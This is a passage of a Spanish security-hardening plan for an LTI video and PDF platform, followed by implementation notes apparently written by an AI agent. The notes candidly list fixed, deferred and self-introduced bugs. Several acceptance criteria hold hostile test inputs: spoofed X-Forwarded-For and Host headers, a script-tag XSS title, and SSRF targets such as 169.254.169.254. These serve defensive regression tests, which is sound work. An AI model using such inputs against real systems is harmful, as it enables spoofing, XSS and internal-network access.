- [ ] `…/membership#Instructor` sigue dando `isInstructor = true`.
- [ ] `roles` como cadena en vez de array no provoca un 500.
- [ ] `POST /lti/platforms` sobre un `(issuer, client_id)` existente responde 409 y
      **no** modifica `jwks_url` ni `enabled`.
- [ ] Toda alta o modificación de plataforma deja fila en `admin_audit_event`.
- [ ] Un `id_token` con `azp` distinto del `client_id` se rechaza aunque `aud` sea una
      cadena.
- [ ] `test/claims.test.js` cubre los tres casos de URI de arriba.

---

### T29 · Cadena de proxy fiable

**Severidad**: alta · **Cierra**: [V-13](#v-13) · **Fase**: producción

**Objetivo.** Que la dirección que se guarda como evidencia forense sea la del
cliente y no la que el cliente diga.

**Diseño.** `infra/nginx/proxy_headers.conf` deja de propagar lo que manda el
cliente: `X-Forwarded-For $remote_addr` (reemplaza, no añade) y
`X-Forwarded-Proto $scheme`, salvo que se documente explícitamente un edge de
confianza y se enumere su dirección. `TRUST_PROXY` pasa a ser el número exacto de
saltos, no una lista de rangos, y se documenta cómo calcularlo para cada topología.
`server_name` deja de ser `_` sin `default_server` que rechace hosts desconocidos.

**Criterios de aceptación**

- [ ] `curl -H 'X-Forwarded-For: 1.2.3.4'` desde una dirección privada produce un
      `view_event` con la dirección **real**, no con `1.2.3.4`.
- [ ] Lo mismo con una cadena de varias direcciones inyectadas.
- [ ] `Host: attacker.example.com` recibe 421 o 404, no llega al upstream.
- [ ] `docs/https-tunel.md` documenta el valor de `TRUST_PROXY` para las dos
      topologías soportadas.

---

### T30 · Revocación y detección de sesiones compartidas

**Severidad**: alta · **Cierra**: [V-09](#v-09) (parcial), mitiga [V-01](#v-01) · **Fase**: seguridad de entrega

**Diseño**: migración `008` con `playback_grant` según la sección
[4.5](#45-detección-de-compartición); `src/services/playback.js` con
`registerGrant`, `touchGrant`, `revokeGrant` e `isRevoked`; caché en memoria de
revocados con refresco cada 10 s; enganche en `requireSession`; señal en el catálogo
del profesor y acción de revocar en la consola de administración.

**Criterios de aceptación**

- [ ] Usar el mismo `sessionToken` desde 4 direcciones distintas marca
      `suspicious_at` y emite un evento de auditoría.
- [ ] Con `PLAYBACK_REVOKE_ON_SUSPICION=true`, la cuarta recibe 401 y la original
      también en su siguiente petición.
- [ ] Revocar desde la consola corta la reproducción en curso en menos de 15 s.
- [ ] Un alumno con red inestable que recarga desde la misma dirección no dispara la
      sospecha.
- [ ] `playback_grant` se purga con el resto de datos caducados.
- [ ] El coste añadido por petición de playlist es inferior a 2 ms con la caché
      caliente.

**Riesgos.** Falsos positivos con CGNAT. El umbral debe ser configurable y el modo
por defecto **avisar sin revocar**, hasta tener datos de una instalación en uso.

---

### T31 · Registro de acceso fiable

**Severidad**: alta · **Cierra**: [V-09](#v-09) (el resto) · **Fase**: forense

**Diseño**

1. `view_event` y `document_view_event` conservan su semántica —un candidato forense
   por sesión—, porque es lo que consume el trazado.
2. Los contadores por petición viven en `playback_grant` (T30), no en `view_event`:
   separar el dato forense del operativo evita tocar los índices de los que depende
   `tools/trace.mjs`.
3. `src/routes/hls.js:55-72` y `src/routes/documents.js:284-301` dejan de tragarse el
   error: un fallo al registrar devuelve **503** tras un reintento. La disponibilidad
   de la base de datos ya es requisito de la reproducción —`authorizeResource` la
   consulta—, así que no se añade una dependencia nueva.

**Criterios de aceptación**

- [ ] Con la base de datos caída, `GET /hls/<id>/index.m3u8` responde 503 y **no**
      devuelve playlist.
- [ ] Un fallo transitorio se reintenta una vez y, si funciona, la petición se sirve
      con normalidad.
- [ ] Recargar el reproductor cinco veces sigue produciendo **un** `view_event` y
      `request_count = 5` en `playback_grant`.
- [ ] `tools/trace.mjs` sigue funcionando sin cambios sobre `view_event`.

---

### T32 · Escapado de plantillas y CSP sin `unsafe-inline`

**Severidad**: alta · **Cierra**: [V-07](#v-07) · **Fase**: seguridad de aplicación

**Diseño.** `src/ui/render.js` escapa `& < > " '` en la sustitución de `{{VAR}}`. Se
añade `renderPage(name, vars, { raw: ['CLAVE'] })` para los valores que sean HTML a
propósito —hoy ninguno—, de modo que saltarse el escapado sea una decisión explícita
y localizable con un `grep`. Se revisan todos los puntos de llamada y los metadatos
que vienen del PDF. Se sustituye `'unsafe-inline'` de `script-src` por un `nonce` por
respuesta.

**Criterios de aceptación**

- [ ] Un material titulado `<script>alert(1)</script>` se muestra como texto en
      `processing.html`.
- [ ] Un título con `"` y `'` no rompe ningún atributo.
- [ ] La CSP ya no contiene `'unsafe-inline'` en `script-src`; el reproductor, el
      visor de PDF, el catálogo y la consola siguen funcionando.
- [ ] Hay una prueba que recorre `src/ui/*.html`, encuentra cada `{{VAR}}` y comprueba
      que un valor hostil sale escapado.

**Riesgos.** El `nonce` obliga a repasar todo `<script>` en línea de las plantillas.
Es mecánico, pero hay que hacerlo entero o la consola deja de cargar.

---

### T33 · JWKS: SSRF y caché

**Severidad**: media · **Cierra**: [V-14](#v-14), [V-19](#v-19) · **Fase**: hardening

**Diseño.** El guard de `platform-validator.js` deja de ser consultivo: se aplica en
`createPlatform`, `updatePlatform` y `upsertPlatform`, y guardar una URL que no lo
pase falla. En ejecución, `src/lti/jwks-cache.js` sustituye el `fetch` global de
`jose` por el `downloadJson` propio —resolución previa, fijación de IP, sin
redirecciones, tope de tamaño— mediante la opción de fetch personalizada de
`createRemoteJWKSet`. La clave de la caché pasa a ser `platform.id + jwks_url`, de
modo que cambiar la URL invalida la entrada en todas las réplicas sin reiniciar.
`http:` deja de admitirse también fuera de producción, salvo variable explícita.

**Criterios de aceptación**

- [ ] Guardar una plataforma con `jwks_url` apuntando a `127.0.0.1`,
      `169.254.169.254` o `10.0.0.1` falla con 400 y mensaje claro.
- [ ] Lo mismo desde `POST /lti/platforms`.
- [ ] Un JWKS que responde 302 hacia un host interno no se sigue.
- [ ] Un JWKS de 100 MB se corta y el proceso no crece.
- [ ] Cambiar `jwks_url` surte efecto en la siguiente petición **sin reiniciar**,
      comprobado con dos procesos contra la misma base de datos.

---

### T34 · Dependencias y cabeceras de la aplicación

**Severidad**: media · **Cierra**: [V-08](#v-08), [V-18](#v-18), [V-21](#v-21), [V-37](#v-37) · **Fase**: hardening

**Diseño**

1. `pdfjs-dist` a **≥ 6.2.108**. Es un salto de versión mayor: revisar la API de
   `getDocument` y `page.render`, que cambia entre 5.x y 6.x, y volver a pasar las
   pruebas del visor.
2. `Cache-Control: no-store` en toda respuesta HTML que lleve un token,
   preferiblemente en un middleware aplicado a cualquier respuesta con
   `{{BOOTSTRAP}}`.
3. `/readyz` devuelve `{ status: 'degraded' }` sin `err.message`; el detalle va al log.
4. Alinear la documentación de `frame-ancestors` con el código.

**Criterios de aceptación**

- [ ] `npm audit --production` no reporta vulnerabilidades altas ni críticas.
- [ ] Las 8 pruebas de la cadena de PDF siguen pasando en la imagen del worker.
- [ ] El visor renderiza un PDF de 300 páginas sin regresión de memoria.
- [ ] La respuesta del launch lleva `Cache-Control: no-store`.
- [ ] `/readyz` con la base de datos caída no revela host, usuario ni motivo.

---

### T35 · Límites y cuotas en la aplicación

**Severidad**: media · **Cierra**: [V-15](#v-15), [V-17](#v-17) (parte de la aplicación), [V-22](#v-22), [V-27](#v-27), [V-34](#v-34) · **Fase**: hardening

**Diseño.** `express-rate-limit` —ya es dependencia— en `/lti/login`, `/lti/launch`,
`/lti/platforms`, `/hls/:id/key`, `/hls/:id/ticket`, `/hls/:id/index.m3u8`,
`/documents/:id/content` y las rutas de subida, con cubos distintos y clave por `jti`
cuando hay sesión y por dirección cuando no. `verifyKeyToken` pasa a comprobar `sub` y
`pid` contra la sesión o el ticket que acompaña la petición. Cuota de almacenamiento
por profesor y comprobación real del `freeBytes` que hoy sólo se registra. Magic bytes
también para vídeo. `LIMIT` en las cuatro consultas sin cota. El bloqueo de la cuenta
de administración deja de contar sólo por `username`.

**Criterios de aceptación**

- [ ] 100 peticiones seguidas a `/hls/<id>/key` con tokens inválidos desde la misma
      dirección acaban en 429.
- [ ] Un alumno reproduciendo un vídeo de una hora **no** llega al límite.
- [ ] Un `kt` válido para el vídeo X pero emitido para otro `sub` responde 403.
- [ ] El límite se aplica por `jti` además de por dirección, para que un aula tras la
      misma NAT no se bloquee entre sí.
- [ ] Un ZIP renombrado a `.mp4` se corta en el primer chunk, como ya hace el PDF.
- [ ] Subir con el disco al 95 % responde 507 antes de aceptar los bytes.
- [ ] 5 intentos fallidos de login admin desde direcciones distintas **no** bloquean
      al administrador legítimo.

---

### T36 · Robustez y validación de entrada

**Severidad**: baja · **Cierra**: [V-25](#v-25), [V-26](#v-26), [V-28](#v-28), [V-31](#v-31), [V-32](#v-32) · **Fase**: fundamentos

**Diseño.** `isUuid` sobre `folderId` y `revisionId` en las tres capas donde hoy
falta, devolviendo 400. La purga manual de revisión se mueve a
`src/services/revisions.js` dentro de una `transaction` con `FOR UPDATE` sobre el
material, como ya hacen `activate` y `discard`. `toMaterialDto` recibe la audiencia y
omite `error` y `folderId` para quien no es el propietario. `hasInstructorRole` y
`refreshFrameAncestors` toleran entradas mal formadas sin romperse ni congelarse.
`authorizeCollection` comprueba propiedad de verdad. `runProcess` mata el grupo de
procesos.

**Criterios de aceptación**

- [ ] `GET /videos?folderId=abc` responde 400, no 500.
- [ ] `GET /videos/<id>/viewers?revisionId=junk` responde 400.
- [ ] Activar y purgar la misma revisión en paralelo termina con la base de datos y el
      disco coherentes: o la revisión sigue entera, o está purgada y no activa. Nunca
      activa y sin ficheros.
- [ ] Un alumno que pide `GET /videos/:id` no recibe `error` ni `folderId`.
- [ ] Un `issuer` no parseable no impide que el resto se incluya en `frame-ancestors`.
- [ ] `authorizeCollection` con el UUID de una colección de otro profesor devuelve
      denegado sin depender de quien la llame.

---

### T37 · Arreglar el trazado forense (reapertura de T13)

**Severidad**: alta · **Cierra**: la deuda que sostiene todo el modelo · **Fase**: forense

**Por qué entra en este plan.** El sistema no impide la copia; la hace atribuible. Si
el trazado no funciona, no hay compensación y todo lo demás protege un contenido que,
una vez filtrado, sigue sin señalar a nadie. La ficha existe en
[`tasks/done/T13-trazado-forense.md`](tasks/done/T13-trazado-forense.md),
marcada 🔴.

**Criterios de aceptación** (además de los que ya tenga la ficha)

- [ ] Un vídeo generado con el patrón conocido de un alumno se identifica
      correctamente entre 200 impostores.
- [ ] Lo mismo tras recomprimir a la mitad de bitrate.
- [ ] Lo mismo tras reescalar a 720p.
- [ ] Se documenta a partir de qué grado de degradación deja de ser concluyente.

---

### T38 · Sello visible por alumno en el PDF

**Severidad**: media · **Mejora**: la asimetría documentada en ADR-014 · **Fase**: producto

**Objetivo.** Que una captura de pantalla de un PDF filtrado señale a alguien, como ya
hace el vídeo.

**Alcance honesto.** Esto **no** es una marca forense: quien recupere los bytes puede
quitar el sello con las mismas herramientas con que se puso. Lo que cambia es que el
sello viaja **dentro** del documento y no en un `div` del DOM, así que sobrevive a la
captura de pantalla, al reenvío y a la impresión, que son las filtraciones reales de
una academia.

**Diseño.** Sellado en la entrega, con caché por `(documentId, revisionId, sub)` en
`MEDIA_ROOT/documents/<id>/<rev>/.stamped/<hash-sub>.pdf`, generado con Ghostscript o
`qpdf --overlay` la primera vez y servido desde caché las siguientes. Purga junto a la
revisión.

**Criterios de aceptación**

- [ ] Dos alumnos descargan PDFs con sellos distintos y visibles.
- [ ] El primer sellado de un documento de 100 páginas tarda menos de 5 s; el segundo
      alumno del mismo documento, menos de 200 ms.
- [ ] La caché se purga con la revisión y no sobrevive a un borrado.
- [ ] La documentación sigue diciendo con claridad que el PDF **no** es atribuible
      forensemente.

**Riesgos.** Almacenamiento: una copia por alumno y revisión. Hay que acotar con
retención y con un límite de alumnos por documento.

---

### T39 · Pruebas de regresión de los ataques

**Severidad**: alta (proceso) · **Fase**: transversal

**Objetivo.** Que ninguno de los hallazgos de este documento pueda volver sin que
falle una prueba. La convención del proyecto es que una tarea no se cierra sin
evidencia; esta tarea convierte la evidencia en algo que se ejecuta en CI.

**Diseño.** `test/security/`, un fichero por vector, escritos como el ataque y no como
la implementación, para que sigan siendo válidos si la implementación cambia:

| Fichero | Comprueba |
|---|---|
| `token-en-url.test.js` | `?st=` rechazado en todas las rutas |
| `material-ajeno.test.js` | Launch con `resourceid` de otro profesor → 404 |
| `segmento-sin-firma.test.js` | Segmento sin firma, con firma ajena y caducada |
| `config-insegura.test.js` | Producción con `MEDIA_DELIVERY=app` no arranca |
| `roles-lti.test.js` | Las URIs de rol que no son de profesor no escalan |
| `plantillas-escapadas.test.js` | Todo `{{VAR}}` escapa |
| `tokens-en-logs.test.js` | Ninguna marca aparece en la salida |
| `ssrf-jwks.test.js` | Direcciones privadas rechazadas al guardar y al usar |
| `proxy-headers.test.js` | `X-Forwarded-For` inyectado no cambia `req.ip` |

**Criterios de aceptación**

- [ ] Las pruebas fallan si se revierte cualquiera de T23, T24, T26, T27, T28, T29 o T32.
- [ ] Corren sin base de datos, en `npm test`.
- [ ] `.github/workflows/ci.yml` las ejecuta, y `npm audit` bloquea el merge ante una
      vulnerabilidad alta.

---

## 6. Orden de ejecución

```text
AHORA ──▶ comprobar el Funnel de local y el BIND_ADDRESS de test (§0)

T25 ─────▶ (infraestructura: cierra V-03 y V-10, y no toca código de aplicación,
            así que puede ir en paralelo con todo lo demás)

T23 ─┬───▶ T30 ──▶ T31      (nuevo modelo de sesión y lo que cuelga de él)
     │
T24 ─┘                      (aislamiento en el launch; comparte src/lti con T28)

T29 ─────▶ T26              (la firma ligada a IP sólo vale si la IP es fiable)

T27 ─┐
T28 ─┼───▶ (independientes entre sí; se pueden repartir)
T32 ─┤
T33 ─┘

T34 · T35 · T36             (hardening; después de que lo anterior asiente)

T37                         (en paralelo desde el día uno, otra persona)
T38                         (al final)
T39                         (se escribe a la vez que cada tarea, no después)
```

**T25 primero, o a la vez que todo**: es la única que cierra una exposición que
depende de una decisión operativa ya tomada, no de un cambio de código. Y no comparte
ficheros con nada más.

**T23 y T24 son las dos críticas de aplicación** y pueden repartirse: comparten poco
más que la carpeta `src/lti`. El modo de gracia de T24 significa que cuanto antes se
despliegue en `warn`, antes se sabe cuántas actividades viejas hay que regenerar.

**T29 antes que T26**: firmar los segmentos con una dirección que el cliente puede
falsificar no protege de nada. El orden importa.

**T23, T30 y T31 van juntas**: son el mismo cambio de modelo y separarlas deja el
sistema a medias, con revocación sin nada que revocar o con tickets sin registro.

**T37 desde el principio**, porque es trabajo de otra naturaleza —medir señal en
vídeo— y porque hasta que no esté, todo lo demás protege algo cuya compensación no
está demostrada.

---

## 7. Lo que seguirá sin estar protegido

En la línea de honestidad que ya sigue la documentación del proyecto, y para que nadie
venda lo que no hay:

- **Sigue sin haber DRM.** Un alumno con acceso legítimo puede grabar la pantalla. El
  objetivo es que esa grabación lo señale, no impedirla.
- **La colusión sigue abierta.** Dos alumnos que comparen copias pueden fabricar una
  tercera que no señale a ninguno (ADR-008). La solución son los códigos de Tardos,
  que siguen en la lista de evolución.
- **El recorte de bordes sigue borrando la marca**, que vive en las esquinas
  inferiores.
- **El PDF sigue sin ser atribuible forensemente**, con o sin T38.
- **Ligar a la dirección del cliente no impide compartir una cuenta**, sólo compartir
  una URL. Un alumno que dé sus credenciales de Moodle a otro está fuera del alcance
  de esta herramienta.
- **Un profesor comprometido sigue siendo un profesor comprometido**: tiene acceso
  legítimo a su propia biblioteca.
- **La etiqueta visible del overlay la controla el profesor** ([V-30](#v-30)). Sirve
  para disuadir, no como prueba. La prueba es el patrón A/B, derivado del `sub`
  firmado.

Lo que estas tareas sí consiguen: que compartir un enlace deje de funcionar, que el
aislamiento entre profesores sea real y no sólo documentado, que ninguna capa por sí
sola pueda producir copias sin marca, que compartir se detecte, y que se pueda cortar
antes de que caduque solo.

---

## 8. Notas de implementación — Claude Fable 5

**Fecha**: 8 de agosto de 2026 · **Rama**: `worktree-security_enhancement`.

Esta sección la añade Claude Fable 5 tras revisar los hallazgos e implementar lo
que tiene sentido cerrar ahora sin acceso al despliegue real. Regla que he
seguido: **implementar sólo lo que puedo dejar correcto y probado desde el
repositorio, y documentar con recomendación concreta lo que exige el entorno
real (navegador, topología del túnel, base de datos de producción) o cambia el
modelo de datos.** Todo lo implementado pasa `npm run lint`, los 187 unitarios y
los 71 de integración contra Postgres.

Aviso importante: **la auditoría se escribió sobre un commit anterior.** Varios
hallazgos ya estaban corregidos en `main` cuando llegué (los marco «ya estaba»).
He verificado cada uno contra el código actual antes de tocar nada.

### 8.1 Resumen por hallazgo

| Hallazgo | Estado | Dónde |
|---|---|---|
| **V-01** token en la URL | ✅ Implementado (T23) | `session.js`, `routes/hls.js`, `ui/assets/video-component.js` — probar HLS nativo iOS |
| **V-02** material de otro profesor | ✅ Fase de aviso (T24) | `lti/resource-signature.js`, migración `011`; `LAUNCH_RESOURCE_SIGNATURE=warn`. Falta activar `enforce` (8.7) |
| **V-03** BIND_ADDRESS publica Postgres | ✅ Ya estaba | `infra/test/compose.yml` ya usa `DB_BIND_ADDRESS` |
| **V-04** tokens en logs | ✅ Implementado (T27) | `logger.js` (serializador `req`), nginx `log_format sin_query` |
| **V-05** rol de profesor por regex | ✅ Implementado (T28) | `lti/claims.js` — lista blanca exacta |
| **V-06** upsert de plataforma sin rastro | ✅ Implementado (T28) | `lti/routes.js` — alta 409, bearer timing-safe, rate limit, longitud mínima |
| **V-07** XSS por el título | ✅ Implementado (T32) | `ui/render.js` escapa `{{VAR}}`; `script-src` ya no lleva `'unsafe-inline'` (8.7) |
| **V-08** pdfjs vulnerable | ✅ Implementado | `pdfjs-dist` 6.2.108 (`npm audit`: 0); `/vendor` deja de ser `immutable` (8.7) |
| **V-09** ciego ante enlace compartido | ⏸️ Diferido (T30/T31) | Ver 8.3 — subsistema `playback_grant` |
| **V-10** secretos y URL pública en local | ✅ Ya estaba / ✅ (V-23) | Los secretos de local viven en `compose.yml` (dev, inseguros a propósito); `infra/local/.env` sigue versionado y lo vigila el gate CI (V-23) |
| **V-11** entrega sin firma en producción | ✅ Implementado (T26, parcial) | `config.js` exige `signed` en prod; `app.js` no monta la ruta |
| **V-12** firma de segmento sin ligadura | ⏸️ Diferido (T26) | Depende de V-13/T29 (IP fiable). Ver 8.3 |
| **V-13** IP forense falsificable | ⏸️ Documentado (T29) | `proxy_headers.conf` — depende de la topología del túnel |
| **V-14** SSRF en JWKS | ✅ Implementado (T33) | `lti/jwks-cache.js` con `customFetch` SSRF-safe; guard bloqueante al guardar (8.7) |
| **V-15** token de clave portador puro | ⏸️ Diferido (T35) | Rate limit por IP retirado (falso positivo con túnel, ver 8.5); ligadura sub/pid diferida (8.3) |
| **V-16** permisos del árbol de medios | ✅ Implementado | `bootstrap-host.sh` usa 755 con motivo; `key.bin`/`key.info` se escriben `0600` |
| **V-17** sin límites en nginx | ✅ Parcial (T25) | `client_max_body_size` acotado; `pids_limit` en los contenedores; `limit_req` de borde diferido (8.3) |
| **V-18** launch HTML sin `Cache-Control` | ✅ Ya estaba | `lti/routes.js:104` fija `private, no-store` en todo el launch |
| **V-19** caché JWKS no revalida la URL | ✅ Implementado (T33) | `lti/jwks-cache.js` — clave = id + jwks_url |
| **V-20** confianza al primer `deployment_id` | ✅ Mitigado (T28) | `services/platforms.js` — tope de crecimiento |
| **V-21** `/readyz` filtra el error de BD | ✅ Implementado (T34) | `routes/health.js` |
| **V-22** `/lti/login` escribe sin límite | ✅ Parcial (T35) | `/lti/platforms` con rate limit; `/lti/login` → borde nginx (8.3) |
| **V-23** `.env` versionado, puerta CI corta | ✅ Implementado (T25) | Gate CI ampliado a `infra/*/.env` (falla si `*SECRET/PASSWORD/TOKEN/AUTHKEY* ` trae valor); el fichero se mantiene versionado a propósito (ver 8.6) |
| **V-24** comparaciones sin tiempo constante | ✅ Implementado | `media/signing.js`, `lti/routes.js` (bearer) |
| **V-25** parámetros sin validar → 500 | ✅ Implementado (T36) | `materials.js`, `collections.js`, `folders.js`, `routes/videos.js` |
| **V-26** carrera en la purga manual | ✅ Implementado (T36) | `services/revisions.js` `purgeRevisionManually` |
| **V-27** consultas sin cota | ✅ Implementado (T35) | viewers, colecciones, revisiones con `LIMIT` |
| **V-28** un DTO para dueño y alumno | ✅ Implementado (T36) | `services/materials.js` `toMaterialDto({owner})` |
| **V-29** `azp`/`target_link_uri` | ✅ Implementado (T28) | `lti/validate.js` |
| **V-30** etiqueta del overlay forjable | 📝 Limitación documentada | Sin cambio de código; la traza es el patrón A/B |
| **V-31** robustez | ✅ Implementado (T36) | `claims.js`, `frame-ancestors.js`, `media/run.js` |
| **V-32** `authorizeCollection` sin propiedad | ✅ Implementado (T36) | `services/authorization.js` |
| **V-33** contenedores/cabeceras sin endurecer | ✅ Parcial (T25) | `server_tokens off`, `no-new-privileges`, `pids_limit` y red interna sin salida para db y worker; `cap_drop`/`read_only` diferidos (8.3) |
| **V-34** bloqueo del admin por inundación | ✅ Implementado (T35) | `admin/auth.js` — cuenta por IP |
| **V-35** parámetros de scrypt fijos y bajos | ✅ Implementado | `admin/auth.js` y `config.js`: suelo y techo en vez de igualdad exacta |
| **V-36** backticks en `release.yml` | ✅ Ya correcto | Los backticks están escapados (`\`` = literal), no es sustitución |
| **V-37** deriva doc/código | ✅ Implementado (T34) | `CLAUDE.md` alineado con el código |

Tareas del plan, tras la segunda iteración (10 de agosto de 2026, ver 8.7):
**T23** ✅, **T24** 🟡 fase de aviso, **T25** parcial, **T26** parcial (V-11),
**T27** ✅, **T28** ✅, **T29** documentado, **T30/T31** ⏸️, **T32** ✅,
**T33** ✅, **T34** ✅, **T35** parcial, **T36** ✅, **T37/T13** ✅ el lector
(ver ficha T13; la promesa forense completa sigue abierta), **T38** ✅ (llegó
por ADR-017, no por esta auditoría), **T39** ✅ salvo las pruebas que dependen
de features diferidas (8.4).

### 8.2 Cómo probar V-01/T23 antes de subir (IMPORTANTE)

El token de sesión ya **no** viaja en la URL. Verificaciones manuales:

1. **Chrome/Firefox/Edge**: abre una actividad de vídeo, pestaña Red → durante
   toda la reproducción **ninguna** URL debe llevar `?st=`. La playlist se pide
   con `Authorization: Bearer` (hls.js `xhrSetup`).
2. `GET /hls/<id>/index.m3u8?st=<token>` (sin cabecera) → **401**. Igual para
   `curl "…/documents/<id>/content?st=<token>"` → **401**.
3. **Safari/iOS (HLS nativo) — el camino menos probado**: el reproductor pide
   `POST /hls/<id>/ticket` con la cabecera y arranca con `?pt=<ticket>` (90 s).
   **Hay que probarlo en un dispositivo real.** Si Safari re-pide la playlist a
   mitad y da 401, sube `PLAYBACK_TICKET_TTL_SECONDS`.
4. El PDF, el catálogo, las miniaturas, el manifest de colección y la descarga
   ya usaban `Authorization: Bearer`, así que no cambian.

### 8.3 Lo que quedó fuera de la PRIMERA iteración, y por qué

> **Leer con 8.7 delante.** Esta sección es el registro de lo que se dejó fuera
> en la primera pasada (agosto de 2026, sobre v1.0.5) y de la recomendación que
> se dio entonces. La **segunda iteración cerró la mayoría**: V-08, V-14, V-16,
> V-35, T32 y la fase de aviso de V-02/T24, además de F-14 y del lector forense
> de T13. Lo que sigue abierto de verdad está listado en 8.7; se conservan aquí
> los razonamientos porque explican por qué cada cosa fue en el orden en que fue.

- **V-02 / T24 — aislamiento por propietario en el launch.** No lo he tocado
  porque es el cambio con más impacto operativo del plan: rompe las actividades
  ya desplegadas hasta que se regeneren, y su diseño correcto (§4.4) exige una
  **migración** (`deep_link_grant`), firmar `custom.resourcesig` en el Deep
  Linking, verificarla en el launch y un **modo de gracia** `warn`/`enforce`.
  Meterlo a medias es peor que no meterlo. Recomendación: implementarlo en una
  entrega propia, desplegar en `warn` desde el primer día para inventariar las
  actividades viejas, y pasar a `enforce` cuando la tabla diga que no quedan sin
  firma. **Hasta entonces, un profesor con permiso para editar una actividad LTI
  puede abrir el material de otro escribiendo su UUID.** Es el hallazgo abierto
  más importante.
- **V-12 / T26 (firma ligada a IP) y V-13 / T29 (X-Forwarded-For).** **Actualizado
  tras el merge con `main`:** `main` ya trae `src/security/client-ip.js` —que
  recupera la IP real del alumno tras Cloudflare aceptando `CF-Connecting-IP`
  **sólo** cuando la petición viene de los rangos publicados de Cloudflare, así
  que no es falsificable— y `src/security/public-origin.js` para el multi-hostname
  (el Host de V-13). Eso cierra la mayor parte de V-13 para la topología real
  (Cloudflare). Lo que queda: para despliegues **sin** Cloudflare, el saneado de
  XFF sigue dependiendo de `TRUST_PROXY`; y **ligar la firma de segmentos a la IP
  (T26/V-12) sigue diferido**, porque cambia el modelo de entrega y el manejo de
  cambios de red del reproductor. Mi comentario en `proxy_headers.conf` conserva
  el aviso para el caso no-Cloudflare. Recomendación: sobre `client-ip.js`, ligar
  la firma a `req.ip` (T26) y bajar el TTL de firma cuando se aborde la entrega.
- **V-09 / T30 / T31 — detección y revocación de sesiones compartidas.** Es un
  subsistema nuevo (migración `playback_grant`, servicio, caché de revocados,
  enganche en cada petición, señal en el catálogo). No cabía como cambio seguro
  en esta pasada. Recomendación: es el complemento natural de T23 —convierte
  «alguien compartió el enlace» de invisible en accionable— y debería ir en la
  siguiente entrega. Mientras tanto sigue el `ON CONFLICT DO NOTHING` y el
  registro «mejor esfuerzo».
- **V-14 / T33 (SSRF en tiempo de ejecución).** Hecho lo seguro (V-19: clave de
  caché por URL). El `customFetch` SSRF-safe de `jose` lo dejo diferido porque
  está en el camino crítico de **todos** los launches: si el envoltorio del
  `Response` falla, no valida ni un login. Recomendación: enrutar `jose` por el
  `downloadJson` ya probado de `platform-validator.js` (resolución previa,
  fijación de IP, sin redirecciones, tope de tamaño), condicionado por
  `ADMIN_ALLOW_PRIVATE_LTI_HOSTS`, y probarlo contra un JWKS público real.
- **V-08 / T34 (pdfjs-dist 5→6).** Salto de versión mayor con cambios de API en
  `getDocument`/`page.render`. Las mitigaciones ya presentes (`isEvalSupported:
  false`, `enableXfa: false`, Ghostscript `-dSAFER`, `object-src 'none'`) bajan
  mucho la explotabilidad. Recomendación: subir la dependencia y **volver a
  pasar las 8 pruebas del visor** (necesitan qpdf/pdfinfo/gs) en la imagen del
  worker antes de dar por buena la migración.
- **V-17 / V-33 / T25 (límites y endurecimiento de contenedor).** Hecho lo
  seguro: `client_max_body_size` acotado a la subida, `server_tokens off`,
  `log_format` sin query. Dejo diferido `read_only` + `cap_drop:[ALL]` porque
  `cap_drop:[ALL]` rompe el cambio a usuario `nginx` del master (necesita
  `SETUID`/`SETGID`/`CHOWN`) y `read_only` exige tmpfs para `/var/cache/nginx`:
  hay que probarlo en el host. `limit_req` en el borde tampoco lo pongo porque,
  con el túnel delante, `$binary_remote_addr` es la IP del túnel y limitaría a
  todo el sitio a un solo cubo. Recomendación: añadir `security_opt:
  ["no-new-privileges:true"]` (seguro) ya, y el resto tras probar en el host.
- **V-15 (ligar `kt` a la sesión) y V-22 (`/lti/login`).** El rate limit por IP
  de `/hls/:id/key` lo **retiré** tras la revisión adversaria (ver 8.5): con el
  túnel delante `req.ip` puede ser compartida y daría 429 a alumnos legítimos, y
  un `kt` inválido ya se rechaza con 403 sin tocar la BD. La ligadura completa de
  `kt` a `sub`/`pid` necesita sesión en la ruta de clave, que el HLS nativo no
  puede aportar: es trabajo del modelo de T23/T30. El freno de `/lti/login` lo
  dejo al borde nginx por el mismo motivo del túnel. Sí queda el rate limit de
  `/lti/platforms` (API de administración, poco tráfico, sin riesgo de aula).
- **V-16 (`key.bin`).** El problema funcional ya está resuelto (`bootstrap-host.sh`
  usa `chmod 755` con su motivo). Endurecer `key.bin` a `0640` con grupo
  compartido node/nginx es una mejora, pero `key.bin` sólo lo lee `node` (la app
  lo sirve por `/hls/:id/key`), nunca nginx, así que la recomendación más simple
  es que el worker lo escriba `0600`. No lo he tocado para no arriesgar la
  entrega de segmentos sin poder probar en un volumen Linux real.
- **V-35 (scrypt).** Bajo. Recomendación: leer N/r/p del propio hash con un
  suelo configurable, para poder subir el coste sin cambiar código.
- **T32 (quitar `unsafe-inline` de la CSP).** El escapado de `{{VAR}}` ya cierra
  el XSS almacenado. Quitar `unsafe-inline` obliga a poner un `nonce` en **cada**
  `<script>` en línea de todas las plantillas y volver a probar player, visor,
  catálogo y consola. Recomendación: hacerlo como tarea propia y mecánica.
- **T37/T13 (trazado forense) y T38 (sello por alumno en PDF).** Fuera del
  alcance de este endurecimiento: T13 es medición de señal en vídeo (otra
  disciplina) y T38 es producto, no seguridad. Sin tocar.

### 8.4 Pruebas de regresión añadidas (T39, parcial)

En `test/security/`, escritas como el ataque:

- `token-en-url.test.js` — `?st=` rechazado; el ticket sólo abre su recurso.
- `roles-lti.test.js` — las URIs de rol que no son de profesor no escalan.
- `plantillas-escapadas.test.js` — todo `{{VAR}}` sale escapado.
- `tokens-en-logs.test.js` — ni `st`/`kt`/`pt`/`md5` aparecen en el log.

Añadidas también `dto-audiencia.test.js` (V-28) y el caso `$&`/`$\`` del
reemplazo por función. Ampliadas `test/claims.test.js` y `test/session.test.js`.
Las de vector que dependen de BD o de features aún no implementadas
(`material-ajeno`, `segmento-sin-firma`, `ssrf-jwks`, `proxy-headers`) quedan
pendientes con la feature que cubren.

### 8.5 Revisión adversaria y correcciones

Antes de dar por buena la entrega pasé el diff por una **revisión adversaria
multiagente** (seis revisores por dimensión + verificadores que intentaban
refutar cada hallazgo). Confirmó 11 problemas, varios introducidos por mí. Los
corregí todos y volví a pasar lint + 191 unitarios + 71 de integración. Queda
aquí por honestidad del registro:

- **Crítico — login de admin roto.** Mi reescritura del conteo de bloqueo (V-34)
  dejaba `$1` ligado pero sin usar en el SQL → Postgres 42P18 al parsear → **el
  login de administración fallaba siempre**. Corregido: el conteo liga sólo la
  IP.
- **Alto — V-28 no hacía nada.** `authorizeResource` no ponía `viaOwner` en el
  scope de alumno, así que `toMaterialDto` recuperaba la vista de dueño por el
  valor por defecto. El alumno seguía viendo `folderId` y `error`. Corregido con
